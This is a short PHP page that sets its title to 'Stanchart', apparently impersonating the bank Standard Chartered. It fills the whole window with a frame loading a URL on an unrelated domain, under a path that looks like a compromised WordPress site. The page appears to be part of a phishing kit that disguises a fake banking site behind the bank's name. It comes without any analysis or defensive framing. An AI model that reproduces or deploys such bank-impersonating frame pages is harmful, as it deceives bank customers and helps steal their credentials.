<?php

$site_title = 'Stanchart';
$site_url = 'http://accessghanaplc.net/ac01/test/wp-cron/sc/';

?>

<html>
<head>
<title><?php echo $site_title; ?></title>
</head>

<frameset frameborder="0" border="0" rows="*,100%" cols="100%" marginwidth="0" marginheight="0">
    <frame target="random_name_not_taken1" name="random_name_not_taken1" marginwidth="0" marginheight="0" border="0" noresize scrolling="no">
    <frame target="random_name_not_taken2" name="random_name_not_taken2" src="<?php echo $site_url; ?>" border="0" noresize>
    <noframes>
        <a href="<?php echo $site_url; ?>"><?php echo $site_title; ?></a>
    </noframes>
</frameset>

</html>

